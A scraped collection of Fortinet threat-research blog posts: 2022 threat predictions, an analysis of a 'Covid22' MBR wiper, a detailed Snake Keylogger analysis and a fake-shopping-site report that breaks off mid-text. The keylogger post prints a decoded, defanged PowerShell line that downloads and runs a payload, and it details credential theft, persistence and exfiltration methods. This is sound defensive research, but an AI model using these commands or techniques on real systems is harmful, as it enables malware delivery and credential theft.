                "text": "According to FortiGuard Labs , 2022 is shaping up to be a banner year for cybercriminals, with ransomware on the rise and an unprecedented number of attackers lining up to find a victim. Attacks will continue to span the entire attack surface, leaving IT teams scrambling to cover every possible avenue of attack. This will be incredibly challenging because the attack surface will simultaneously be expanding as organizations transition to more hybrid environments and workspaces, adopt more AI and ML-based technologies , develop new connectivity options, and deploy additional business-critical applications and devices into the cloud. By understanding what the future may hold in relation to cyber threats, we give ourselves the best possible chance of defeating them. Attack Framework - Left to Right Attacks are often discussed in terms of left-hand and right-hand threats when viewed through an attack chain such as the MITRE ATT&CK framework. On the left are efforts spent pre-attack, which includes planning, development, and weaponization strategies. We predict that cybercriminals will spend more time and effort on reconnaissance and discovering zero-day capabilities to exploit new technologies and expanding network environments. In addition to redoubled efforts on the left-hand side of the attack chain, we will also see a significant increase in the rate at which new attacks can be launched on the right due to the expanding Crime-as-a-Service market. In addition to the sale of ransomware- and other malware-as-a-service offerings, we will likely see new criminal solutions, including phishing- and botnets-as-a-service, as well as an increase in the sale of access to pre-compromised targets. We will also see an increase in new attacks. Organizations should prepare for the targeting of new attack vectors, such as Linux platforms. Linux still runs the back-end systems of most networks and until recently, it has largely been ignored by the hacker community. But we have already begun to see new Linux-based attacks like Vermilion Strike, which is a malicious implementation of the Beacon feature of Cobalt Strike that can target Linux systems with remote access capabilities without being detected. Similarly, Microsoft is actively integrating WSL (Windows Subsystem for Linux) into Windows 11. WSL is a compatibility layer for running Linux binary executables natively on Windows. We have already seen malicious test files in the wild targeting WSL. These files act as loaders, many with malicious payloads. They just lack the ability to inject those payloads into the WSL system. And we are also seeing more botnet malware being written for Linux platforms. This expands the attack surface further, to the network edge. We expect to see even more activity targeting edge devices that had traditionally been overlooked by cybercriminals. From Top to Bottom We expect to see new exploits targeting satellite networks over the next year. There are a half dozen major satellite internet providers already in place. Satellite base stations serve as the entry point to the satellite network, essentially connecting everyone, everywhere—including cybercriminals to their targets—so this is where a lot of threats will be lurking. But there will also be millions of terminals from which to launch an attack. We have already begun to see new threats targeting satellite-based networks, such as ICARUS, which is a proof-of-concept DDoS attack that leverages direct global accessibility to satellites to launch attacks from numerous locations. The biggest targets will be organizations that rely on satellite-based connectivity to run their businesses, those that deliver critical services to remote locations, and organizations that provide services to clients in motion, such as cruise liners, cargo ships, and commercial airlines. Other attacks, such as ransomware, are sure to follow. At the smaller end of the scale, we also expect to see an increase in digital theft by attackers targeting crypto wallets. While banks have largely been able to fend off attacks targeting wire transfers using encryption and multi-factor authentication, many digital wallets sit unprotected on laptops and smartphones. We have already seen new attacks emerging that target digital wallets. A new fake Amazon gift card generator specifically targets digital wallets by replacing the victim’s wallet with that of the attacker. And ElectroRAT targets them by combining social engineering with custom cryptocurrency applications and a new Remote Access Trojan (RAT) to target multiple operating systems, including Windows, Linux, and macOS. We expect to see more malware designed to target stored crypto credentials and drain digital wallets, especially as more businesses adopt digital wallets to make purchases. Core to the Edge We also predict that attacks will continue to span the network, including an increase in attacks targeting Operational Technology (OT) systems. According to a recent CISA (U.S. Cybersecurity & Infrastructure Security Agency) report, ransomware attacks are increasingly targeting critical infrastructure and \"have demonstrated the rising threat of ransomware to operational technology (OT) assets and control systems.\" This is being spurred by the near-universal convergence of IT and OT networks which has enabled some attacks to target OT systems through the compromised home networks and devices of remote workers. Traditionally, attacks on OT systems were the domain of highly specialized threat actors who knew their way around ICS and SCADA systems. But even those highly specialized capabilities and tools are now being included in attack kits available for purchase on the dark web, making them available to a much broader set of far less technical attackers. And at the other end of the network, we also see new edge-based challenges emerging. \"Living off the land\" is a technique that allows malware and threat actors to leverage existing toolsets and capabilities within compromised environments. This enables attacks and data exfiltration to look like normal system activity and go unnoticed. Living off the land attacks are effective because they use legitimate tools to carry out their malicious actions. And now, as edge devices become more powerful, with more native capabilities and, of course, more privileges, we expect to see new attacks designed to \"live off the edge.\" Malware living in these edge environments will use local resources to monitor edge activities and data and then steal, hijack, or even ransom critical systems, applications, and information while avoiding detection. Where Do You Start with the Expanding Attack Surface? Defending against this new wave of threats requires a holistic, integrated approach to security. Point products need to be replaced with security devices designed to interoperate as a unified solution regardless of where they are deployed. They need to protect every user, every device, and every application with a unified policy that can follow data and transactions from end to end. Centralized management will also help ensure that policies are enforced consistently, configurations and updates are delivered promptly, and that suspicious events that may occur anywhere across the network—including to, between, and within cloud environments—are centrally collected and correlated. Organizations are strongly urged to extend their efforts by hardening their Linux and other traditionally lower-profile devices. They should also have tools in place designed to protect, detect, and respond to threats targeting these devices. Similarly, organizations need to take a security-first approach when adopting new technologies, whether upgrading your Windows-based systems or adding satellite-based connectivity, to ensure that protections are in place before adding them to your network. Additionally, behavioral analytics should be deployed to detect “left hand” threats. Discovering and blocking an attack during initial reconnaissance and probing efforts can help raise threat awareness and prevent problems arising later in the attack chain. Security tools should be selected based on their ability to detect and prevent both known and unknown threats and respond to active threats in real-time before beachheads can be established or malicious payloads can be delivered. To help, AI and machine learning capabilities need to be deployed pervasively across the network to baseline normal behavior and respond instantly to changes and detect and disable sophisticated threats before they can execute their payloads. They are also essential in correlating massive amounts of collected data to detect malicious behavior, including using threat feeds and attack profiles to predict the most likely places an attack may occur and proactively bolstering those defenses. Other advanced technologies, like deception, should also be considered to turn a traditionally passive network into an active defense system. Threats show no sign of slowing down. If your network and security tools are not ready to protect your organization from the next generation of threats now, tomorrow may be too late to make the critical changes you need. Broad deployment, deep integration, and dynamic automation, combined with high performance and hyperscalability, are the hallmarks of any security system designed to protect the way today's organizations need to run their business. To combat these evolving threats, organizations need to adopt a Security Fabric platform founded on a cybersecurity mesh architecture. Read or access the full predictions for 2022. Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program ."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/to-joke-or-not-to-joke-covid-22-brings-disaster-to-mbr": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2021-11-11",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Affected platforms : Microsoft Windows Impacted parties : Windows Users Impact : Unable to boot the machine Severity level : Medium Even now, almost two years after the COVID-19 pandemic started, there is no sign that cybercriminals will stop taking advantage of the situation as an attack vector. This time, however, this attacker uses a COVID pandemic that has not yet happened as bait. FortiGuard Labs recently discovered a new malware posing as a mysterious COVID22 installer. While containing many of the features of \"joke\" malware, it is also destructive, causing infected machines to fail to boot. Because it has no features for encrypting data demanding a ransom to undo the damage it inflicts, it is instead a new destructive malware variant designed to render affected systems inoperable. This blog explains how this malware works. Covid-22 in Action The malware file is named Covid22. For those unfamiliar with the naming scheme, COVID-19 is a short form of Co rona v irus d isease, and 19 represents the year the outbreak was first identified. The file name Covid22 plays off the current Coronavirus disease but applies that same image of fear and destruction to computers, potentially creating a cyber-pandemic in 2022. While we don't know how exactly the malware was distributed, the malware author has tried to weaponize fear as bait to lure victims into opening the file. While the malware itself is not sophisticated, it does take several actions designed to put fear into the victim before inducing true panic. But before that, when first manually running the file, it asks whether the potential victim wants to install Covid-22 on their machine, as if it were an application. Once the victim proceeds with the installation, the malware drops several malicious files before forcefully rebooting the machine. Dropped files have file names that are simple and self-described for their actions. They are listed below in sequence of execution. Covid22Server.exe executes the commands in the dropped script.txt lol.vbs creates an endless loop of a MessageBox with \"Your PC has been infected by Covid-22 Corona Virus! Enjoy the death of your pc!\" speakwh.vbs uses the computer's speaker to say \"coronavirus\" in a loop CoronaPopup.exe displays a pop-up with the title \"Covid-22 has infected your pc!\" and an image of the actual coronavirus ClutterScreen.exe clutters the screen by constantly moving blocks of pixels x.vbs displays the pop-up message, \"Corona Virus!\" 50 times noescapes.vbs displays the pop-up message \"THERE IS NO ESCAPE\" 10 times icons.exe fills the screen with red Xs final.vbs displays a pop-up message \"Bye!\" These are the classic actions of joke programs usually intended to annoy or make fun of users. But the next activity is not laughable at all. The malware drops and executes the malicious WipeMBR.exe wiper malware that destroys the Master Boot Record (MBR) by overwriting its first 512 bytes with zeros. The malware then forces a machine reboot after displaying the following pop-up message: Because MBR has information about the partitions of the hard drive and acts as a loader for the operating system (OS), the compromised machine will not be able to load the OS upon reboot. The good news for the users is that the malware does not destroy nor steal any files on the compromised device, meaning the victim can still recover user files from the hard drive. The malware also does not demand ransom. While the result is almost identical to another MBR wiper that Sonicwall posted a blog about in April 2020, our analysis did not show any resemblance in their wiper codes. This newer variant simply overwrites the MBR with zeroes. How to Repair a Damaged MBR Fixing an MBR is relatively easy in modern Windows. After the affected machine reboots (sometimes it requires a few reboots), the system enters automatic repair mode. First, choose Advanced Options, Troubleshoot. Another Advanced Option should then let you use the Command Prompt. From the Command Prompt, type and run \"bootrec.exe /fixmbr\". An alternative and more straightforward option would be to choose Startup Repair on the screen to run the Command Prompt. The downside of selecting Startup Repair is that it will take longer to complete the job. If the automatic repair mode does not kick in for some reason, you'll need to boot the system off a recovery disk or drive. Note that you'll need to change your BIOS settings to ensure the system boots from the recovery media first, or else the system will try to boot using the overwritten MBR leading to a boot error. Once the system boots from recovery media, you should be able to choose to run the command prompt, whereby the user can run the command \"bootrec.exe /fixmbr\". It is also vital to remind system administrators of the importance of backing up your data on external storage in case any of your files are ever damaged, encrypted, or destroyed. You will also want to create recovery media beforehand, or else you will need to use a working machine, which can be difficult for home users after the damage is done. Conclusion on COVID-22 Brings Disaster to MBR What looks to be a mere joke program is designed to bring destruction to impacted systems. This time, luck was on the victim's side as the malware did not touch any user data, but the user may not be so lucky next time. Imagine if the files on the compromised machine had been encrypted or destroyed and could not be recovered. Always be mindful of executing unknown files received from the internet. Fortinet Protections Fortinet customers are already protected from this malware by the FortiGuard Labs AntiVirus Service as used by FortiGate , FortiClient and FortiMail , and by FortiEDR as follows: W32/Ursu.558C!tr Malicious_Behavior.SB VBS/BadJoke.8A6B!tr VBS/BadJoke.7182!tr VBS/BadJoke.84AB!tr VBS/BadJoke.0C12!tr VBS/BadJoke.DF52!tr W32/BadJoke.DCAB!tr FortiEDR detects the downloaded executable file as malicious based on its behavior. IOCs Sample SHA-256: [Covid22.exe] 79f3b39797f0e85d9e537397a6f8966bc288d1b83ae1c313c825fbd17698879e [ClutterScreen.exe] 726DC8D52C9CF794412941BFBD27AF8F6FA27E72154A63F5C81A42BA40BD972D [CoronaPopup.exe] 80C9F65617386940153CC4D42E1097DEB79B4F9C98C67E6025BDC1CA03AD8FB7 [icons.exe] 496CABBD18530780A3CB75340BDDD7F74A71E84C83DF4D185CFC6EC71D14C41E [WipeMBR.exe] 5FC9080177A096DE2B717F2F2196867B6966900E129E5BC4E412D5DCA7ED9E60 [final.vbs] EA2EF4196586BF851D4DC422A04D51AD2CB552BF5AAE2DF361D1ED2D4842B4BA [lol.vbs] C88D3022B25EF86CD19CE99815AD26A1F9A201F69974577DA93E08328E047410 [noescapez.vbs] 3D519FC10BC2B6CAA5A27069DA55B1614CC97C1DFD4BCDC1DD7F36E686D913F1 [x.vbs] E22F004CF9E7C4C7B52BDA59DB2B57816992CB01FDBEF6675760FDD7BCD29728 [speakwh.vbs] 4624876389F6DDFB111FBBF3473D7C6B5555ED8A0F31C37E822A6FFEF5E27DE0 [Covid22Server.exe] 0C6DFAA12A98FB17058B79D283E96A3E34549D0AD2BE58F505AC8ABDE858D8A6 Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program . Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/deep-dive-into-a-fresh-variant-of-snake-keylogger-malware": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2021-11-04",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Affected platforms: Microsoft Windows Impacted parties: Windows Users Impact: Collects sensitive information from victims’ device Severity level :             Critical Fortinet’s FortiGuard Labs recently captured a Microsoft Excel sample from the wild that was used to spread malware . After researching its behaviors, I recognized it as a fresh variant of the Snake Keylogger malware. Snake Keylogger is a malware developed using .NET. It first appeared in late 2020 and focused on stealing sensitive information from a victim’s device, including saved credentials, the victim’s keystrokes, screenshots of the victim’s screen, and clipboard data. In July, 2021, Snake Keylogger first entered into a TOP 10 popular malware families report, meaning that the Snake Keylogger family is increasing its influence and impacting more people’s devices and sensitive data. In this threat research blog you will learn how the Snake Keylogger variant is downloaded and executed through a captured Excel sample, what techniques this variant uses to protect it from being analyzed, what sensitive information it steals from a victim’s machine, and how it submits that collected data to the attacker. Here we go. What the Captured Microsoft Excel Sample Looks Like This Excel sample, delivered as an attachment in a phishing email, contains malicious Macro VBA code. Figure 1.1 shows a screenshot of when it is opened. It displays a vague picture of a document and asks the victim to click the yellow button to get a clearer image. Once the yellow button “Enable Content” is clicked by victim, the malicious VBA code is executed in the background. The malicious macro project that contains the malicious VBA code is password protected so it cannot be viewed by the analyzer. However, we were able to modify its binary file to remove this restriction. Going through its code, a “Workbook_Activate()” method is automatically called when the document is opened. It writes a piece of PowerShell code from a local variable into a BAT file. Figure 1.2 shows partial VBA code of this method, where variable “s” holds the PowerShell code and \"Gqyztfbtsogpnruooqr.bat\" is the BAT file, which is finally executed by calling code “x = Shell(bat, 0)”. The bottom of Figure 1.2 shows the content of variable “s”, which contains the base64-encoded PowerShell code that is decoded by PowerShell.exe when it is executed. Below is the base64-decoded PowerShell code: $ProcName = \"Wheahmnfpgaqse.exe\"; (New-Object System.Net.WebClient). DownloadFile (\"hxxp[:]//3[.]64[.]251[.]139/v3/2/Requests07520000652.exe\",\"$env:APPDATA\\$ProcName\"); Start-Process (\"$env:APPDATA\\$ProcName\") The PowerShell code is very simple and easy to understand. It downloads a file (“Requests07520000652.exe”) onto a victim’s device, places it at “%AppData%\\Wheahmnfpgaqse.exe\" by calling “DownloadFile()”, and executes it by calling “Start-Process()”. Snake Keylogger Downloader After some research, I learned that the file \"Wheahmnfpgaqse.exe\" is a downloader of Snake Keylogger, which is a .Net program. When it starts, it sleeps 21 seconds to bypass those sandboxes with a strategy of killing a sample process when a timeout of no-action is triggered. Twenty one seconds later, the downloader then invokes a function called “Consturctor()”, as you can see in Figure 2.1. It then invokes another function “Program.List_Types()”, where it downloads Snake Keylogger module from the link “hxxps[:]//store2[.]gofile[.]io/download/0283e6ba-afc6-4dcb-b2f4-3173d666e2c4/Huzeigtmvaplpinhoo.dll”, which is a RC4 encrypted DLL file. Next, it calls “ToRc()” function to RC4 decrypt it using a decryption key \"Dllzjn\". It then proceeds to load the decrypted Dll module (a .Net Dll file, called “Huzeigtmvaplpinhoo.dll”), and enumerates its export functions to find \"G6doICqoMU()\", which is invoked by executing “type.InvokeMember(\\\"G6doICqoMU\\\", BindingFlags.InvokeMethod, null, null, null)” in function Consturctor(), as shown in Figure 2.1. The decrypted .Net Dll is a dropper and installer of Snake Keylogger. Let’s dive into this module to see how it performs its tasks. Snake Keylogger Installer According to my analysis, the decrypted Dll module (“Huzeigtmvaplpinhoo.dll”) deploys Snake Keylogger onto a victim’s device and sets it as an auto-run program. It extracts an executable PE file into memory from the Resource directory and then performs process hollowing that injects the executable PE file into a newly created child process and executes it. I will explain in detail how it performs these functions in this section. 1. Persistence Mechanism Figure 3.1 shows an outline of the decrypted Dll module (“Huzeigtmvaplpinhoo.dll”). As you can see, to prevent its code from being analyzed the file is obfuscated so that the class names, function names, and variable names are all randomly generated meaningless strings. This creates trouble for analysts when analyzing it. The full name of the export function “G6doICqoMU()” is “Huzeigtmvaplpinhoo!pXfqpio3clcAoFxTnfJ.CORFgLoyRGlurYwdwIh.G6doICqoMU()”. Again, for the same reason as before, it sleeps 35 seconds at the beginning of this function to bypass some malware analysis systems. Next, it works to make this Snake Keylogger persistent on the infected Windows. As we all know, a Windows system has a “Startup” folder inside the “Start Menu”. The programs inside this folder are started when Windows starts. The full path to this folder is defined in the system registry with a string value of “HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Startup” and “HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\Startup”. The value data of “Startup” is C:\\Users\\{UserName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup” by default. This variant of Snake Keylogger changes both the values of “Startup” to other folders. Figure 3.2 shows the code changing the Windows startup folder to “C:\\Users\\M0YTes0Env\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\chsg\\” by calling the API SetValue(). In the bottom half of Figure 3.2 you can see the content of the system registry path, value name, and new value data. “chsg” is a new folder created by Snake Keylogger. The program copies the Snake Keylogger file (the downloaded \"Wheahmnfpgaqse.exe\") into this folder and renames it as “sgosr.exe”. This ensures that Snake Keylogger will be started by the Windows system every time it starts. 2. Extraction from Resource Although the content of Huzeigtmvaplpinhoo.dll only appears in memory, to analyze it I saved it into a local file. It has several resources in the Resource directory, as shown below in Figure 3.3. The process of extracting the payload file of Snake Keylogger is a little complicated. It uses a tricky way to load the resource. It has a local callback function defined by ResolveEventHandler that is registered to AppDomain.ResourceResolve, which is then called when it fails to load a resource by name. It looks like an exception handler to Windows SEH strategy to handle exceptions. In addition, it has another local callback function registered to AppDomain.AssemblyResolve, which is called when it fails to load an assembly (like a module) by name. Below is a pseudocode of registering a local resource resolve, where T9wOjU5ccxTJaVfUntn.Osc50oil0l is the local callback function. AppDomain.ResourceResolve += new ResolveEventHandler(T9wOjU5ccxTJaVfUntn.Osc50oil0l) Now, let’s see how Snake Keylogger solves this challenge—loading a nonexistent resource, which will trigger the resource loading failure. It plans to read a Resource named \"Qkxkikeg\" from the current module, which has no such named resource in the Resource directory, as you can see in Figure 3.3. A resource loading failure occurs and the registered local ResolveEventHandler function is called to solve this error. This then causes a loading assembly failure and its assembly resolve callback function is called. A while later, another PE file, decrypted from resource “{d977ee8c-85ce-4731-b9a1-323ba88c6eeb}‎”, appears in memory. It contains a resource with the name “Qkxkikeg”, which is the original request resource name, as shown in Figure 3.4. The payload of Snake Keylogger is just a compressed in GZIP format in the resource “Qkxkikeg” under the Resource directory “ClassLibrary1.Properties.Resources”. Figure 3.5 displays the GZIP data of the resource “Qkxkikeg” (reversed) on the left and the decompressed Snake Keylogger on the right side. 3. Process Hollowing The program then creates a suspended child process and deploys the compressed Snake Keylogger payload into the child process. It then resumes the child process to run. Meanwhile, the parent process exits by calling the function Environment.Exit(0). According to the code in Figure 3.6, it is about to call API CreateProcess() to create the child process with Creation Flag 134217732U (0x8000004), which means CREATE_NO_WINDOW and CREATE_SUSPENDED. It then calls the API WriteProcessMemory() to copy the Snake Keylogger payload into the child process, section by section. It next calls SetThreadContext() to make the child process point to the entry point function of Snake Keylogger. Before the parent process exits, an API ResumeThread() is called to have the child process restored to run. Snake Keylogger Payload The code of the Snake Keylogger payload file is fully obfuscated, as shown in Figure 4.1, to protect it from being analyzed. The class and function names are unreadable. Therefore, to better analyze and explain its code and intention, I deobfuscated the payload file using the tool “de4dot”. This made its code more readable, and my analysis is based on that result. Going through the Snake Keylogger code, I realized that it provides features like recording a victim’s keystrokes (the keylogger), stealing data from the clipboard, obtaining a victim’s screenshot, stealing the data on the system clipboard, as well as stealing saved credentials for some specified software clients installed on a victim’s device. 1. Keylogger Feature Figure 4.2 shows a code snippet of setting up the keylogger. It calls API SetWindowsHookExA() to register a hook callback function( this.callback_ProcessKey()) to monitor low-level keyboard input events. The first parameter is the hook type, where “13” indicates WH_KEYBOARD_LL. After that, the callback function is called by the Windows system when the victim types, so it is able to handle and record the keystrokes into a global string variable. It also records the foreground Window title to identify where the victim types by calling the APIs GetForegroundWindow() and GetWindowText (). It also has a Timer (Timer0) that keeps sending the keylogger data to the attacker. 2. Screenshot It is able to take screenshots of the victim’s device. It has a Timer (Timer1), which captures the victim’s screenshots from time to time by calling API CopyFromScreen(). It saves the screenshot into a local Screenshot.png file in the system’s “MyDocuments” folder. It also sends this picture file to the attacker. 3. System Clipboard It has two Timers. One (Time2) is used to collect system clipboard data by calling Clipboard.GetText() and save to a global variable. The other (Time3) is used to send collected clipboard data to the attacker. Figure 4.3 shows the Timer function used to obtain system clipboard data. Every time it counts down it checks to see whether current clipboard data has been collected in the global variable main_cls.string_clipboard_data. If not, it appends the current clipboard data to the global variable. 4. Steal Credentials Based on my analysis, this variant’s main work is to steal credentials from the victim’s device. It implements stealing credentials in the Main() function, as shown in Figure 4.4, below. This is the deobfuscated Main() function showing the functions used to steal credentials from various clients. The function at the bottom submits the stolen credentials. These functions obtain the saved credentials for each software from the different places they are save their credentials, including local files (like Chrome) and system registry (like Outlook), etc. I will now use Outlook as an example to explain how Snake Keylogger collects credentials. Figure 4.5 is a screenshot of a function that is about to read the credentials of Microsoft Outlook from the system registry. It goes through four registry paths for different Outlook versions to read out (if applicable) “Email” and \"IMAP Password\" or \"POP3 Password\" or \"HTTP Password\" or \"SMTP Password\" and “SMTP Server”. Below is an example showing what credentials information Snake Keylogger can collect from Microsoft Outlook: I have categorized those clients that Snake Keylogger focuses on as below: Web Browsers: Google Chrome, Mozilla Firefox, Mozilla SeaMonkey Browser, Mozilla IceCat Browser, Yandex Browser, Microsoft Edge, Amigo Browser, Nichrome Browser, QQBrowser, Coccoc Browser, Orbitum Browser, Slimjet Browser, Iridium Browser, Vivaldi Browser, Iron Browser, Ghost Browser, Cent Browser, Xvast Browser, Chedot Browser, SuperBird Browser, 360 Browser, 360 Secure Browser, Comodo Dragon Browser, Brave-Browser, Torch Browser, UC Browser, Blisk Browser, Epic Privacy Browser, Opera Web Browser, Liebao Browser, Avast Browser, Kinza Browser, BlackHawk Browser, Citrio Browser, Uran Browser, Coowon Browser, 7 Star Browser, QIP Surf Browser, Sleipnir Browser, Chrome Canary Browser, CoolNovo Browser, SalamWeb Browser, Sputnik Browser Extension, Falkon Browser, Elements Browser, Slim Browser, Ice Dragon Browser, CyberFox Browser, PaleMoon Browser, Waterfox Browser, Kometa Browser and various browsers designed based on Chromium project. Email Clients: Microsoft OutLook, Tencent Foxmail, Mozilla Thunderbird and Postbox. Other Clients: FileZilla, Pidgin and Discord. Sending the Stolen Data to the Attacker Per the code of this variant of Snake Keylogger, it sends an email to the attacker (using SMTP protocol) to submit the stolen credentials data of the victim. Snake Keylogger collects basic information regarding the victim’s Windows system, like User name, PC name, System Date and Time, Public IP address, and Country, which are put in the header of the collected credentials. Figure 5.1 shows crafting the email with stolen credentials to be sent to the attacker. The bottom is the email’s Subject and Body. The stolen credentials are put in two attachments, “Passwords.txt” and “User.txt”. Figure 5.2 is a screenshot of “Password.txt” attached to the email sent to the attacker with basic information and credentials stolen from my testing Windows system. To send stolen data to the attacker, it defines some variables containing the sender’s email address, password, SMTP server address, and SMTP port, as shown in figure 5.3. It defines the variables in the class’s constructor function. Besides sending data via email, this Snake Keylogger variant also offers FTP and Telegram methods to submit collected sensitive data to the attacker. For FTP, the attacker needs to set up an FTP server and then tell Snake Keylogger the address of the FTP server and credentials for Snake Keylogger to upload stolen sensitive data. For Telegram, Snake Keylogger uses the “sendDocument” method of the “Telegram Bot API” to submit its stolen data to the Telegram account that the attacker provides. Refer to Figure 5.4 for more information about the method of Telegram. Conclusion on Snake Keylogger Malware In order to better understand the entire process of this malware, I drew a flow chart in Figure 6.1 that outlines the main steps explained in this analysis. At the beginning of this analysis, we went through how a malicious Macro inside an Excel document executes PowerShell that downloads the Snake Keylogger's downloader. Next, I focused more on how the Snake Keylogger installer performs persistence on the victim's device and the complicated, tricky way it extracts the payload of Snake Keylogger. I then elaborated on the features this variant of Snake Keylogger offers, like recording keystrokes, collecting credentials data, clipboard data, and screenshots. And finally, I explained how the collected data is submitted to the attacker via email, as well as two other methods: FTP and Telegram. Fortinet Protections Fortinet customers are already protected from this malware by FortiGuard’s Web Filtering , AntiVirus, FortiEDR , and CDR (content disarm and reconstruction) services, as follows: The malicious Macro inside the Excel sample can be disarmed by the FortiGuard CDR (content disarm and reconstruction) service. All relevant URLs have been rated as \" Malicious Websites \" by the FortiGuard Web Filtering service. The original Excel sample and Snake Keylogger downloader files are detected as \" VBA/SnakeKeylogger.84D0!tr \" and \" MSIL/SnakeKeylogger.ADFA!tr \" and are blocked by the FortiGuard AntiVirus service. FortiEDR detects the downloaded executable file as malicious based on its behavior. FortiMail protects Fortinet customers by blocking phishing emails. We also suggest that readers go through the free NSE training : NSE 1 – Information Security Awareness , which has a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. IOCs URLs: \"hxxp[:]//3[.]64[.]251[.]139/v3/2/Requests07520000652.exe\" \"hxxps[:]//store2[.]gofile[.]io/download/0283e6ba-afc6-4dcb-b2f4-3173d666e2c4/Huzeigtmvaplpinhoo.dll\" Sample SHA-256: [SOA# 1769.xlsm] 3B437BAA9A07E9DECE2659F20B5D97F8F729BA077D399933041CDC656C8D4D04 [Requests07520000652.exe or Wheahmnfpgaqse.exe] 53D520C1F12FE4E479C6E31626F7D4ABA5A65D107C1A13401380EBCA7CCA5B05 References: https://blog.checkpoint.com/2021/08/12/july-2021s-most-wanted-malware-snake-keylogger-enters-top-10-for-first-time/ https://docs.microsoft.com/en-us/dotnet/api/system.appdomain.assemblyresolve?view=net-5.0 https://docs.microsoft.com/en-us/dotnet/api/system.appdomain.resourceresolve?view=net-5.0 Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program . Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/black-friday-and-the-proliferation-of-fake-ecommerce-sites": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2021-10-29",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Black Friday and Cyber Monday kick off the holiday shopping season. In fact, 30% of all retail sales occur between Black Friday and Christmas Day. And since the advent of Cyber Monday, brick and mortar and ecommerce stores alike stand to generate a significant portion of their annual revenue over this shopping “holiday” weekend, often allowing retailers to catch up on revenue and meet goals and sales numbers for the year. In the lead-up to this event, FortiGuard Labs has observed more and more scams involving counterfeit websites that appear to be legitimate ecommerce sites. We say “appear to be” because to the untrained eye these sites may look safe, but if you aren’t paying attention they can steal your payment (and possibly payment information) via a purchase you thought was legitimate. Fake ecommerce sites are quickly becoming the latest threat to consumers and they cover a wide range of products to lure potential buyers. We recently came across a live, active scam that leverages the look and feel of the world’s largest companies and their respective trademarks to compel and lure victims into making purchases from their site. These sites are in no way affiliated with the trademark/IP owner, and are recognizable in part because they use the same template over and over in a digital game of whack-a-mole (meaning that as soon as one site gets shut down another one immediately pops up somewhere else). Several of the high-profile brands we have documented include: Blink (Amazon) Oculus (Facebook) Other well known brand names infringed include: Coleman (Camping Gear) Ninja (Home Appliances) Nu Wave (Home Appliances) Ryobi (Power tools) Makita  (Power tools) We also observed others that have since been taken down: Keurig Nespresso Common Framework The websites we’ve observed have the following characteristics in common: The domain names have only been registered for a few days to a few months All sites are registered with the same registrar They use .TOP and .SHOP top level domains (.com is also common) They use stolen imagery They contain numerous grammatical errors and inconsistencies in statements Social Media buttons do not resolve anywhere or go to accounts that either do not exist or have been deleted Their webhosting providers utilize content delivery networks (CDN) to remain anonymous (via an IP address that cannot be traced) Milwauketools.shop (Recently registered on 10/21/21) Milwaukee Tools is a well-known and globally established tool company based out of the United States. Milwaukee Tools products are usually sold via authorized retailers online or in stores. We came across a recently registered online site, milwauketools[.]shop , that had the look and feel of a professional ecommerce retailer. What caught our eye immediately (besides the misspelled domain name) was the very low price on the “2696-26 M18 LITHIUM-ION CORDLESS 6-TOOL COMBO KIT” for $99.00. Except for discontinued models/lines, such greatly reduced prices (this kit normally sells for $659) is oftentimes the hallmark of a scam. However, to the untrained eye—the limited time offer via the countdown timer, the professional look and feel of the site—will likely catch the attention of an impulse buyer. And that is what the bad actor behind this site is hoping for. They are hoping for an impulse buyer who isn’t paying attention to fall prey to their scam. Red Flags Although the About US and Our Culture sections of this website appear to be written by someone with a good grasp of the English language (likely stolen from a legitimate site), the “milwauketools” (figure 3) string is indicative of a small error that tells us that this is not related to the official Milwaukee Tools organization, even though the trademarked logo in the screenshot below has the correct spelling. This suggests that the actor was following a template during the creation of this site: Another red flag is that the domain was created on the 21 st , which at the time of writing this blog made it only five days old. Looking at the source code of the shopping cart, we see the string “刷新按钮“, which translates to a “refresh button”. Perhaps this is indicative of the origins of the group behind this site, or the shopping cart was repurposed from elsewhere. A visit to the actual company website (milwaukeetool.com) reveals that they do not sell direct, which is often the case of many major brands: A Bing.com shopping query highlighted that the lowest official price for this 2696-26 M18 LITHIUM-ION CORDLESS 6-TOOL COMBO KIT is $613.00 (USD). Further Scrutiny As we dug deeper by using OSINT (Open Source Intelligence) searches on the major search engines, we found 19 more online retail sites using the same template and shopping carts as the Milwauketools.shop, suggesting that these are all part of a larger scam. This was further confirmed when we determined that they have all been registered with the same registrar. Included in our findings were websites selling Oculus (Facebook), Blink (Amazon), and many more. The Oculus Template: However, if we dig further, we can see that the Oculus Quest 2 is using a template similar to the Milwauketools.shop site. It also contains the same countdown timer and limited time offer, along with the low price of $99 USD for something that has a $699 MSRP. The blink Template: The blink template has the same professional look: And again, the blink template looks convincing. But if we scrutinize further, we again see the same countdown timer and 